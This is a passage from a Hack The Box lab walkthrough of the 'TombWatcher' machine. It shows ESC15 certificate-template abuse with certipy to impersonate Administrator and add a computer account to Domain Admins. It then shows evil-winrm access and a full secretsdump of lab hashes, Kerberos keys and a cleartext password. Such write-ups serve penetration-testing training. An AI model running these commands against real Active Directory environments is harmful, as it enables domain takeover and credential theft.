                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

> Refer - https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc15-cve-2024-49019-arbitrary-application-policy

![](/assets/obsidian/539077b1fa4a79360d2f6a95cffb08da.png)

Enroll the template `WebServer` by supplying the CA an arbitrary EKU OID (`-application-policies`) then impersonate `administrator` (`-UPN`)

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ certipy req -dc-ip $(pt get ip) -u "$(pt get user)@$(pt get domain)" -hashes ":$(pt get hash)" -application-policies 'Client Authentication' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn "Administrator@$(pt get domain)"
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Authenticate with the certificate to get a ldap shell, add a computer account then add it to `Domain Admins` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ certipy auth -dc-ip $(pt get ip) -pfx administrator.pfx -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# add_computer workstation 'Bravosec1337!'
Attempting to add a new computer with the name: workstation$
Inferred Domain DN: DC=tombwatcher,DC=htb
Inferred Domain Name: tombwatcher.htb
New Computer DN: CN=workstation,CN=Computers,DC=tombwatcher,DC=htb
Adding new computer with username: workstation$ and password: Bravosec1337! result: OK

# add_user_to_group 'workstation$' 'Domain Admins'
Adding user: workstation to group Domain Admins result: OK
```


### 5985 - Winrm

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ creds-set 'workstation$' 'Bravosec1337!'
[+] Password set for user workstation$

┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250529.25123.80c4dba - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in workstation$.ccache
```

Remote winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ KRB5CCNAME="$(pt get ticket)" evil-winrm -r $(pt get domain) -i $(pt get rhost)

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\workstation$\Documents> whoami
tombwatcher\workstation$
*Evil-WinRM* PS C:\Users\workstation$\Documents> cat C:\users\administrator\desktop\root.txt
297a0935e49a2b5da4c82ed3b53d0d2a
```


# Additional
---

## Post exploitation


### Secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/TombWatcher]
└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump
/home/kali/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250529.25123.80c4dba - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x2b8ef47a87661bc318fdb0df9934ca49
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d51fbf710c21b8e3dabc9ecca56ae12f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
TOMBWATCHER\DC01$:plain_password_hex:9e740924d8a645a9bb62441522ffb3e42ed3c26ba992a6aeb1c9a825827d324d7f50d3b829ebcb4ec51089ac3396b66bb1b385c67c7209f1974c189ce542f7579b7e5c654071289f3cfee09f026bbaf3f23510f1e05cb8ba42920c80f98ef5eb905cb03977ea7e81ece0a829d5a860a8b677122d331ac4e9f3ce943a1bb76f493bfb6fa6446283dd641a54c9ba8f9f3b0cba88aed10112eb8bf92369bc391190240cf261f25b6600fd6c9d2ad9140d3958a152b20e39db2b3d22818093ce4ef6525a2def5fd99742dc733acf5b1dbe0361b105ff18e704256f6108bae75ec3a81d434cbb2c66a07d226ebd768b2892c0
TOMBWATCHER\DC01$:aad3b435b51404eeaad3b435b51404ee:ca045fb171f8b565d6e772b0a75c6f5f:::
[*] DefaultPassword
TOMBWATCHER\Administrator:HTB_@cad3my_lab_W1n19_r00t!@0
[*] DPAPI_SYSTEM
dpapi_machinekey:0xf04214e8dd3e91c19d04267e1dd8feba11e993c4
dpapi_userkey:0xb16bec62c57b1ba254993bcc17b51d8be38f05a6
[*] NL$KM
 0000   AB D6 62 BE AF 5D 71 A3  4F 6C 55 D5 17 34 E8 E1   ..b..]q.OlU..4..
 0010   11 2F 1F BA 8C 96 3F EF  24 16 E9 85 49 14 9E 66   ./....?.$...I..f
 0020   B3 9D BD 0A 35 D4 62 48  0C 2D D2 45 06 D9 49 FB   ....5.bH.-.E..I.
 0030   10 20 1E C4 71 19 05 63  DC B9 B0 43 CD 19 76 5E   . ..q..c...C..v^
NL$KM:abd662beaf5d71a34f6c55d51734e8e1112f1fba8c963fef2416e98549149e66b39dbd0a35d462480c2dd24506d949fb10201ec471190563dcb9b043cd19765e
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:964accf7288128f78f8638bbc42f6456:::
Henry:1103:aad3b435b51404eeaad3b435b51404ee:2f3b5dd61cd9784435ee12a93c93fa6c:::
Alfred:1104:aad3b435b51404eeaad3b435b51404ee:cf5fd610b326e61f175e3a9bac4751f9:::
sam:1105:aad3b435b51404eeaad3b435b51404ee:4ff50deb62abb56d811389eea639ee96:::
john:1106:aad3b435b51404eeaad3b435b51404ee:ad9324754583e3e42b55aad4d3b8d2bf:::
cert_admin:1111:aad3b435b51404eeaad3b435b51404ee:f87ebf0febd9c4095c68a88928755773:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ca045fb171f8b565d6e772b0a75c6f5f:::
ansible_dev$:1108:aad3b435b51404eeaad3b435b51404ee:4b21348ca4a9edff9689cdf75cbda439:::
workstation$:7601:aad3b435b51404eeaad3b435b51404ee:4ff50deb62abb56d811389eea639ee96:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:801527c932ddcae90d138ba33890cbca50fc17a69d568fbd2fb5a0b43e0b657d
Administrator:aes128-cts-hmac-sha1-96:20a6fe1a495077a8afca2ad5818efe8c
Administrator:des-cbc-md5:e686ecc7e06223a8
krbtgt:aes256-cts-hmac-sha1-96:8f542c56a5377012c49cca51cd05da37aeca080e9060e7609c64df6294e78e28
krbtgt:aes128-cts-hmac-sha1-96:ab84d027f672bb33d571a81d763db4c1
krbtgt:des-cbc-md5:f84cf26e672c1902
Henry:aes256-cts-hmac-sha1-96:311aa3cc0fd80d729d93e5e1a536583e00a2602e6ad1da923912cbafd800cb7c
Henry:aes128-cts-hmac-sha1-96:259d254eb2541b0d3db69ebd3dee4695
Henry:des-cbc-md5:199bda8040cb2f89
Alfred:aes256-cts-hmac-sha1-96:d9ff146302951a37f31e63517856f229c6cbde76dc3ee3199d05991fdc4054bb
Alfred:aes128-cts-hmac-sha1-96:e8ffe7e17a148309e41267647f1b051d
Alfred:des-cbc-md5:f27052ab5b7ffd08
sam:aes256-cts-hmac-sha1-96:dee6bc4f56d1747a2cc436981e82206ad467c8b6d96c0bfa468eba920618e8f4
sam:aes128-cts-hmac-sha1-96:43dc447c73e027d670bff735e1cd101a
sam:des-cbc-md5:b62943d919387a4c
john:aes256-cts-hmac-sha1-96:7db39419a586707f178cf5185597047589931429ea46bfb11813c86cab6136df
john:aes128-cts-hmac-sha1-96:d5b228c8638ca4c4c8e5d697082fe901
john:des-cbc-md5:43b9fef783ad8038
cert_admin:aes256-cts-hmac-sha1-96:368c783b04ab180897b73ae0da88722e28be1ff8fbbdf88f780059f4d7da2f33
cert_admin:aes128-cts-hmac-sha1-96:a56a7c9045da370bb9c8634236fbeb94
cert_admin:des-cbc-md5:2ac4d0150be90810
DC01$:aes256-cts-hmac-sha1-96:4bac22380dd160bce1048a092662b825f716276f16d64a88225895b9c34eecc3
DC01$:aes128-cts-hmac-sha1-96:2859bbfd267207104cdc068c1aaf19c8
DC01$:des-cbc-md5:37983b293e585251
ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a
ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226
ansible_dev$:des-cbc-md5:8fc40dd9f4d62916
workstation$:aes256-cts-hmac-sha1-96:90ddd5dd0c0508bdc229fe1687419c0172e0e044c1d9e7cb46554585b5e83379
workstation$:aes128-cts-hmac-sha1-96:f427360d1eb94e34718108ca5363b7d0
workstation$:des-cbc-md5:adc8a202e6c29d08
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```


### Files

```bash
[+] C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Test-WsMan
Get-NetTCPConnection -LocalPort 5985,5986
Get-NetFirewallRule -Name "WINRM-HTTP-In-TCP"
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True
Get-NetFirewallRule -Name "WINRM-HTTP-In-TCP"
Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -Profile Domain,Private,Public
Get-NetFirewallRule -Name "WINRM-HTTP-In-TCP"
Restart-Service WinRM
exit
cd Documents
dir
type updates.txt
Invoke-WebRequest -Uri "https://catalog.s.download.windowsupdate.com/d/msdownload/update/software/secu/2024/10/windows10.0-kb5044277-x64_5a0128140341e370680ab2542eb9da87de878110.msu" -OutFile .\kb5044277.msu
Get-NetAdapter
ipconfig
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0 2" -ServerAddresses 8.8.8.8
Invoke-WebRequest -Uri "https://catalog.s.download.windowsupdate.com/d/msdownload/update/software/secu/2024/10/windows10.0-kb5044277-x64_5a0128140341e370680ab2542eb9da87de878110.msu" -OutFile .\kb5044277.msu
dir
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0 2" -ServerAddresses 127.0.0.1
ipconfig
shutdown /s /t 0
cd Documents
dir
wusa.exe kb5005112.msu
wusa.exe kb5044277.msu
wusa.exe windows10.0-kb5054695-x64_afdd257a714567eef1c721a9b16b04396d9975a0.msu
shutdown /s /t 0
```

```bash
PS C:\Users\workstation$\Documents> cat C:\Users\Administrator\Music\tomb_cleanup.ps1
## Delete User cert_admin
Remove-ADUser -Identity cert_admin -Confirm:$False

## Remove Alfred as a member of Infrastructure
Remove-ADGroupMember -Identity Infrastructure -Members Alfred -Confirm:$false

## Clear ACL's for john
$namingcontext= (get-aduser 'john').DistinguishedName
dsacls "$namingcontext" /R sam
dsacls "$namingcontext" /R Henry
dsacls "$namingcontext" /R Alfred
dsacls "$namingcontext" /R ansible_dev$

## Set ACE on 'john' to allow 'sam' user WriteOwner over john
$domain_group = (get-aduser 'sam').SID
$group_domain= (get-aduser 'john').DistinguishedName
$ADObject = [ADSI]("LDAP://$group_domain")
$sid = [System.Security.Principal.IdentityReference] $domain_group
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "WriteOwner"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inherit = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $sid,$adRights,$type,$inherit
$ADObject.psbase.ObjectSecurity.AddAccessRule($ace)
$ADObject.psbase.commitchanges()

## Revert 'john' to default owner
$userDN = (Get-ADUser "john").DistinguishedName
$defaultOwner = (Get-ADGroup "Domain Admins").SID
$user = [ADSI]"LDAP://$userDN"
$sd = $user.psbase.ObjectSecurity
$sd.SetOwner($defaultOwner)
$user.psbase.ObjectSecurity = $sd
$user.psbase.CommitChanges()
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```